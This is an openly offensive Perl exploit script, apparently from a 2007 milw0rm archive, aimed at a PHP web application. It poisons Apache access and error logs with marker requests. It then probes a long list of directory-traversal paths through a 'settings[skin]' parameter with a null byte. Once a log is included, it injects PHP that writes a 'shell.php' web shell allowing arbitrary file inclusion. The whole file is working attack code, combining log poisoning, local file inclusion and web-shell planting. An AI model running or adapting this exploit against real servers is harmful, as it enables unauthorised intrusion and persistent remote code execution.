#Made by Bl0od3r
#tech-bl0od3r.blogspot.com

use IO::Socket;
use Switch;
{
$port = "80"; #
$target = @ARGV[0]; # 
$folder = @ARGV[1]; # 
@paths=(
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log",
"../../../apache/logs/access.log"
);

$sack_bad=IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$target,PeerPort=>$port) || die "[Error while connecting]\n";
print $sack_bad "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\n";
print $sack_bad "Host: $target\n";
print $sack_bad "Connection: close\n";
close($sack_bad);

###################################################################################################################################

$sack_good=IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$target,PeerPort=>$port) || die "[Error while connecting]\n";
print $sack_good "GET /index.php?&AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\n";
print $sack_good "Host: $target\n";
print $sack_good "Connection: close\n";
close($sack_good);
###################################################################################################################################

print "[+]Fake paths created.\n";

foreach $path (@paths)
{
        $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[Error while connecting]\n";
        print $sock "GET ".$folder."themes/default/?theme[options]=232222&settings[skin]=".$path."%00 HTTP/1.1\n";
        print $sock "Host: $target\n";
        print $sock "Accept: text/html\n";
        print $sock "Connection: close\n\n\r\n";
        while ($answer = <$sock>) {
$out.=$answer;
 }

        if ($out =~ m/AAAAAAAAAAAAAAAAAAAAAAAAAAA/) {
print "Found->[".$path."]";
&code();
}

}

sub code() {
$code_sock=IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$target,PeerPort=>$port) || die "[Error while connecting]\n";
print $code_sock "GET /<?php \$file=fopen('shell.php','w');fwrite(\$file,'<?php include(\$_GET[file]) ?>'); ?> HTTP/1.1\n";
print $code_sock "Host: $target\n";
print $code_sock "Connection: close\n\n";

print "\n[+]Bad Code Injected\n";

&cmd();
}

sub cmd() {
print "[+]Successfully created:shell.php\n";
exit;
}
}

# milw0rm.com [2007-03-14]
